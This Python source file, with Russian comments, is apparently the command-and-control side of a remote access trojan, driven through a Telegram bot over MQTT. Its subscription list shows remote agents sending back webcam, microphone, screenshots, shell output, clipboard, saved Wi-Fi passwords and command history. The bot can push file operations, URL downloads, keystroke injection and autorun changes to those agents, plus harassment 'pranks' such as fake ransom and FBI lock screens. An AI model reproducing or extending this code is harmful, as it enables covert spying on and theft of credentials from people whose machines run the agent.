"""MQTT-транспорт для Telegram-бота XGENT.

Бот подписывается на топик статусов {prefix}/+/status и публикует команды
в {prefix}/<device_id>/cmd или {prefix}/all/cmd.
"""

import json
import logging
import threading
import time
import uuid
from typing import Any, Callable, Dict

import paho.mqtt.client as mqtt

from config import ENCRYPT_PAYLOAD, MQTT_BROKER, MQTT_PASSWORD, MQTT_PORT, MQTT_PREFIX, MQTT_TLS, MQTT_USERNAME
from crypto import sign_message
from xgencrypto import encrypt_payload

log = logging.getLogger("xgent.transport")


class MQTTTransport:
    """Обёртка над paho-mqtt: подключение, подписка, публикация команд."""

    def __init__(self, on_message: Callable[[str, Dict[str, Any]], None]):
        self.on_message = on_message
        self.connected = threading.Event()
        self._client = mqtt.Client(
            mqtt.CallbackAPIVersion.VERSION2,
            client_id="xgent-bot",
            protocol=mqtt.MQTTv311,
        )
        self._client.reconnect_delay_set(min_delay=2, max_delay=30)
        self._client.on_connect = self._on_connect
        self._client.on_disconnect = self._on_disconnect
        self._client.on_message = self._on_message
        if MQTT_TLS:
            self._client.tls_set()  # системные CA; без отключения проверки сертификата
        if MQTT_USERNAME:
            log.info("MQTT auth: пользователь %s (TLS=%s", MQTT_USERNAME, MQTT_TLS)
            self._client.username_pw_set(MQTT_USERNAME, MQTT_PASSWORD)

    def _on_connect(self, client, userdata, flags, reason_code, properties=None):
        if reason_code == 0:
            self.connected.set()
            # Медиа и мониторинг
            client.subscribe(f"{MQTT_PREFIX}/+/status", qos=0)
            client.subscribe(f"{MQTT_PREFIX}/+/screenshot", qos=0)
            client.subscribe(f"{MQTT_PREFIX}/+/webcam", qos=0)
            client.subscribe(f"{MQTT_PREFIX}/+/sysinfo", qos=0)
            client.subscribe(f"{MQTT_PREFIX}/+/mic", qos=0)
            client.subscribe(f"{MQTT_PREFIX}/+/shell", qos=0)
            client.subscribe(f"{MQTT_PREFIX}/+/processes", qos=0)
            client.subscribe(f"{MQTT_PREFIX}/+/clipboard", qos=0)
            client.subscribe(f"{MQTT_PREFIX}/+/battery", qos=0)
            client.subscribe(f"{MQTT_PREFIX}/+/network", qos=0)
            client.subscribe(f"{MQTT_PREFIX}/+/services", qos=0)
            client.subscribe(f"{MQTT_PREFIX}/+/capabilities", qos=0)
            client.subscribe(f"{MQTT_PREFIX}/+/ack", qos=0)
            client.subscribe(f"{MQTT_PREFIX}/+/disks", qos=0)
            # Файловые операции
            client.subscribe(f"{MQTT_PREFIX}/+/file_get", qos=0)
            client.subscribe(f"{MQTT_PREFIX}/+/file_put", qos=0)
            client.subscribe(f"{MQTT_PREFIX}/+/file_del", qos=0)
            client.subscribe(f"{MQTT_PREFIX}/+/dir_list", qos=0)
            client.subscribe(f"{MQTT_PREFIX}/+/find_file", qos=0)
            client.subscribe(f"{MQTT_PREFIX}/+/path_open", qos=0)
            # Сеть и система
            client.subscribe(f"{MQTT_PREFIX}/+/ext_ip", qos=0)
            client.subscribe(f"{MQTT_PREFIX}/+/wifi_info", qos=0)
            client.subscribe(f"{MQTT_PREFIX}/+/usb_devices", qos=0)
            client.subscribe(f"{MQTT_PREFIX}/+/netstat", qos=0)
            client.subscribe(f"{MQTT_PREFIX}/+/startup_list", qos=0)
            client.subscribe(f"{MQTT_PREFIX}/+/env_get", qos=0)
            client.subscribe(f"{MQTT_PREFIX}/+/net_wifi_passwords", qos=0)
            client.subscribe(f"{MQTT_PREFIX}/+/net_bluetooth_list", qos=0)
            client.subscribe(f"{MQTT_PREFIX}/+/storage_smart", qos=0)
            client.subscribe(f"{MQTT_PREFIX}/+/sys_installed_apps", qos=0)
            client.subscribe(f"{MQTT_PREFIX}/+/sys_history_cmd", qos=0)
            # Управление вводом, дисплей, загрузка
            client.subscribe(f"{MQTT_PREFIX}/+/hotkey", qos=0)
            client.subscribe(f"{MQTT_PREFIX}/+/type_text", qos=0)
            client.subscribe(f"{MQTT_PREFIX}/+/msgbox_spam", qos=0)
            client.subscribe(f"{MQTT_PREFIX}/+/wallpaper_set", qos=0)
            client.subscribe(f"{MQTT_PREFIX}/+/download_url", qos=0)
            client.subscribe(f"{MQTT_PREFIX}/+/screen_off", qos=0)
            client.subscribe(f"{MQTT_PREFIX}/+/screensaver_on", qos=0)
            client.subscribe(f"{MQTT_PREFIX}/+/display_brightness", qos=0)
            client.subscribe(f"{MQTT_PREFIX}/+/display_night_light", qos=0)
            client.subscribe(f"{MQTT_PREFIX}/+/display_rotate", qos=0)
            client.subscribe(f"{MQTT_PREFIX}/+/geo_location", qos=0)
            client.subscribe(f"{MQTT_PREFIX}/+/volume_set", qos=0)
            client.subscribe(f"{MQTT_PREFIX}/+/volume_toggle", qos=0)
            # Процессы
            client.subscribe(f"{MQTT_PREFIX}/+/kill_process", qos=0)
            client.subscribe(f"{MQTT_PREFIX}/+/proc_kill_name", qos=0)
            # Приколы
            client.subscribe(f"{MQTT_PREFIX}/+/prank_screamer", qos=0)
            client.subscribe(f"{MQTT_PREFIX}/+/prank_rickroll", qos=0)
            client.subscribe(f"{MQTT_PREFIX}/+/prank_matrix", qos=0)
            client.subscribe(f"{MQTT_PREFIX}/+/prank_siren", qos=0)
            client.subscribe(f"{MQTT_PREFIX}/+/prank_shout_tts", qos=0)
            client.subscribe(f"{MQTT_PREFIX}/+/prank_swap_mouse", qos=0)
            client.subscribe(f"{MQTT_PREFIX}/+/prank_crazy_cursor", qos=0)
            client.subscribe(f"{MQTT_PREFIX}/+/prank_hide_desktop", qos=0)
            client.subscribe(f"{MQTT_PREFIX}/+/prank_dancing_windows", qos=0)
            client.subscribe(f"{MQTT_PREFIX}/+/prank_random_site", qos=0)
            # Общий топик текстовых ответов и диагностики
            client.subscribe(f"{MQTT_PREFIX}/+/output", qos=0)
            client.subscribe(f"{MQTT_PREFIX}/+/standby_sleep", qos=0)
            client.subscribe(f"{MQTT_PREFIX}/+/wake", qos=0)
            client.subscribe(f"{MQTT_PREFIX}/+/autorun_status", qos=0)
            client.subscribe(f"{MQTT_PREFIX}/+/autorun_enable", qos=0)
            client.subscribe(f"{MQTT_PREFIX}/+/autorun_disable", qos=0)
            client.subscribe(f"{MQTT_PREFIX}/+/power", qos=0)
            client.subscribe(f"{MQTT_PREFIX}/+/agent_update", qos=0)
            client.subscribe(f"{MQTT_PREFIX}/+/uninstall_agent", qos=0)
            client.subscribe(f"{MQTT_PREFIX}/+/sys_uptime", qos=0)
            client.subscribe(f"{MQTT_PREFIX}/+/sys_clean_temp", qos=0)
            client.subscribe(f"{MQTT_PREFIX}/+/net_ping", qos=0)
            for _p in (
                "prank_bsod", "prank_fake_update", "prank_toast_spam", "prank_keyboard_disco",
                "prank_beep_morse", "prank_open_notepad_type", "prank_hacker_typer",
                "prank_sound_spooky", "prank_sound_fart", "prank_minimize_all",
                "prank_open_calc_spam", "prank_invert_screen", "prank_slow_mouse",
                "prank_random_clicks", "prank_paste_clipboard_spam", "prank_type_reversed",
                "prank_volume_jump", "prank_say_whisper", "prank_fake_virus", "prank_open_cd",
                "prank_change_wallpaper", "prank_restore_wallpaper", "prank_speak_time",
                "prank_rickroll_terminal", "prank_screen_off_brief", "prank_alert_loop",
                "prank_open_browser_memes", "prank_glitch_cursor", "prank_shake_window",
                "prank_meme_wallpaper", "prank_caps_disco", "prank_cursor_circle",
                "prank_fake_error_spam", "prank_fake_delete_sys32", "prank_ghost_typer",
                "prank_fbi_lock", "prank_cat_invaders", "prank_fake_ransom_cats",
                "prank_nyan_stream", "prank_random_beeps", "prank_confetti_winner",
                "prank_low_battery_fake", "prank_earthquake", "prank_laugh_track",
            ):
                client.subscribe(f"{MQTT_PREFIX}/+/{_p}", qos=0)
            log.info("Подключено к %s:%s, топики успешно подписаны", MQTT_BROKER, MQTT_PORT)
        else:
            log.warning("Не удалось подключиться к брокеру: %s", reason_code)

    def _on_disconnect(self, client, userdata, flags, reason_code, properties=None):
        self.connected.clear()
        log.warning("Отключено от брокера (код %s)", reason_code)

    def _on_message(self, client, userdata, message):
        try:
            data = json.loads(message.payload.decode("utf-8"))
        except (ValueError, UnicodeDecodeError):
            log.warning("Некорректный JSON в топике %s", message.topic)
            return
        try:
            self.on_message(message.topic, data)
        except Exception:
            log.exception("Ошибка обработки сообщения из %s", message.topic)

    def start(self) -> None:
        """Неблокирующий запуск: retry-loop при отсутствии интернета.

        Запускает отдельный поток, который пытается подключиться к брокеру
        раз в 5 секунд (до 12 попыток = 1 минута), после чего paho сам
        управляет переподключением через loop_start().
        """
        self._client.loop_start()
        threading.Thread(target=self._connect_with_retry, daemon=True, name="mqtt-connector").start()

    def _connect_with_retry(self, max_attempts: int = 0, delay: float = 5.0) -> None:
        """Попытки подключения с паузой. max_attempts=0 — бесконечно."""
        attempt = 0
        while True:
            attempt += 1
            try:
                log.info("[MQTT] Попытка подключения #%d к %s:%d...", attempt, MQTT_BROKER, MQTT_PORT)
                self._client.connect(MQTT_BROKER, MQTT_PORT, keepalive=60)
                log.info("[MQTT] Подключение инициировано, ждём on_connect.")
                return  # paho loop_start() возьмёт на себя дальнейшее
            except Exception as exc:
                log.warning("[MQTT] Попытка #%d неудачна: %s", attempt, exc)
                if max_attempts and attempt >= max_attempts:
                    log.error("[MQTT] Все %d попыток исчерпаны — работаем без брокера.", max_attempts)
                    return
                log.info("[MQTT] Повтор через %.0f сек...", delay)
                time.sleep(delay)

    def stop(self) -> None:
        self._client.loop_stop()
        self._client.disconnect()

    def publish_command(self, device_id: str, cmd_type: str, **kwargs: Any) -> bool:
        """Отправить команду устройству или всем устройствам (device_id='all').

        Каждая команда получает короткий id (correlation) и публикуется с QoS 1,
        результат publish проверяется по коду возврата rc.
        """
        if not self.connected.is_set():
            log.warning("Команда %s не отправлена: нет соединения с брокером", cmd_type)
            return False
        topic = f"{MQTT_PREFIX}/all/cmd" if device_id == "all" else f"{MQTT_PREFIX}/{device_id}/cmd"
        cmd_id = kwargs.pop("id", uuid.uuid4().hex[:8])
        payload = {"type": cmd_type, "id": cmd_id, **kwargs}
        if ENCRYPT_PAYLOAD:
            body = encrypt_payload(payload)
        else:
            body = payload
        message = sign_message(body)
        info = self._client.publish(topic, json.dumps(message, ensure_ascii=False), qos=1)
        if info.rc != mqtt.MQTT_ERR_SUCCESS:
            log.warning("Команда %s не ушла в %s (rc=%s)", cmd_type, topic, info.rc)
            return False
        log.info("Команда %s (id=%s) -> %s", cmd_type, cmd_id, topic)
        return True
